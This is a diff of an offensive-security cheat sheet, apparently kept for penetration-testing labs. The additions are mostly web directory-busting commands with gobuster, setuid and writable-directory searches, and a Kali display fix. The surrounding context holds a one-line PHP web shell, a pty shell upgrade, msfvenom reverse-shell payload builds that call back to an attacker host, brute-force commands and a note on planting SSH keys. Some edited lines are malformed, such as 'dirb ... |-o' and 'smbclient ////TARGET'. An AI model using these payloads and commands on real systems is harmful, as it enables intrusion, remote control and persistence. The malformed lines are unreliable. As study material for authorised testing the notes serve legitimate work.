@@ -32,11 +32,18 @@ tar xvzf archive.tar.gz
 #packages used below that may not be included by default in Kali
 apt-get install seclists gobuster
 
+-------------------------- Setting up Non-Root Kali---------------
 #Setting up a non-root user (wireshark and other risky things)
 adduser <something>
 
 #Add them to Wireshark Group
 usermod -aG wireshark <something>
+
+#https://github.com/P0cL4bs/WiFi-Pumpkin/issues/53 to fix things like Sparta GUI breaking
+export QT_X11_NO_MITSHM=1
+# To permanently fix
+echo "QT_X11_NO_MITSHM=1" >> /etc/environment
+
 
 #Give up control on xhost
 xhost +
@@ -173,6 +180,11 @@ nmap --script=/usr/share/nmap/scripts/smtp-enum-users.nse
 
 -------------------------------------------
 80 - http
+SEC LISTS = https://github.com/danielmiessler/SecLists.git
+or
+apt-get install seclists
+
+
 # Look for:  Webserver version (Apache 2.34 etc.) AND Web Application Version (WordPress?), Server date time, Options allowed
 amap $tgt 80
 nikto -host $tgt -port $tgtPort
@@ -183,7 +195,7 @@ echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80
 curl -I http://$tgt:3000/
 
 # Start crawling the site for sites:
-dirb http://$tgt/ |tee dirb-$portNum.out
+dirb http://$tgt/ |-o dirb-$portNum.out
 
 # Now check for files and end points
 dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out
@@ -195,7 +207,14 @@ curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" https://{
 
 curl -H 'Accept: application/json' -H "Authorization: Bearer ${token}" http://$tgt:3000/users/
 
+#Initial Sweep of the website (Directory Busting) with Go Buster
+gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://$tgt/
+gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://$tgt
 
+gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out
+
+#Confirm hidden pages
+gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e
 -------------------------------------------
 135 - RPC
 # See what remote clients can interact with
@@ -225,10 +244,10 @@ openssl s_client -connect $tgt:443
 # Do we have creds to enum that users shares?
 
 # Check null
-smbclient -L //$tgt -N
+smbclient -L \\\\$tgt -N
 
 # Mount Up...
-smbclient //TARGET/Backups -I $tgt -N
+smbclient ////TARGET/Backups -I $tgt -N
 #or
 mount -t cifs //$tgt ip/Backups /media/ -o username=NULL
 
@@ -323,7 +342,7 @@ wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://$tgt/FUZZ.
 curl -i http://$tgt:80/
 
 #Initial Sweep of the website (Directory Busting)
-gobuster -u http://$tgt9/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+gobuster dir -u "http://$tgt/" -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e |tee gobuster-dir-80.out
 
 #Confirm hidden pages
 gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e
@@ -422,6 +441,8 @@ http://www.defaultpassword.com/
 ============================================================================================
 ##nc shell upgrade to /bin/bash/
 python -c "import pty;pty.spawn('/bin/bash');"
+python3 -c "import pty;pty.spawn('/bin/bash');"
+
 
 <?php echo shell_exec($_GET['cmd']);?>
 
@@ -535,6 +556,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_
 msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
+
+============================================================================================
+					POSH For PenTesters (Notes From PenTester Academy)
+============================================================================================
+# Enumerate HotFixes
+Get-HotFixes
 
 ============================================================================================
 					WINDOWS COMMAND LINE STUFF
@@ -1179,6 +1206,7 @@ Automated:  the script lse at: https://github.com/diego-treitos/linux-smart-enum
 4. insecure permissions
 	a. custom scripts
 	b. setuid
+		find / -perm -4000 -o -perm -2000 2>/dev/null
 
 1. Command histories
 history
@@ -1212,6 +1240,16 @@ b.
 # To find setuid / setgid 
 find / -perm -4000 -o -perm -2000 2>/dev/null
 find /usr/bin -perm -4000 2>/dev/null
+
+for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lh $i;done
+
+
+
+#find juicy dirs
+find / -type d -perm -777 | xargs ls -ld
+
+# find writable dirs
+find / -type d -writable 2> /dev/null
 
 for i in $(find / -perm -4000 -o -perm -2000 2>/dev/null); do ls -lha $i;done
 for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lha $i;done
@@ -1326,6 +1364,9 @@ getent passwd |tail -3
 #find juicy dirs
 find / -type d -perm -777 | xargs ls -ld
 
+# find writable dirs
+find / -type d -writable 2> /dev/null
+
 #Look for or plant SSH private keys
 ~username/.ssh
 
@@ -1404,6 +1445,9 @@ medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10
 ------------------HASHCAT---------------
 hashcat -h |grep -i ntlm
 hashcat -m 5600 thehash.ntlmv2
+
+# Hashcat with Salted with MD5
+
 
 ==========================================================================================
                 LATERAL MOVEMENT
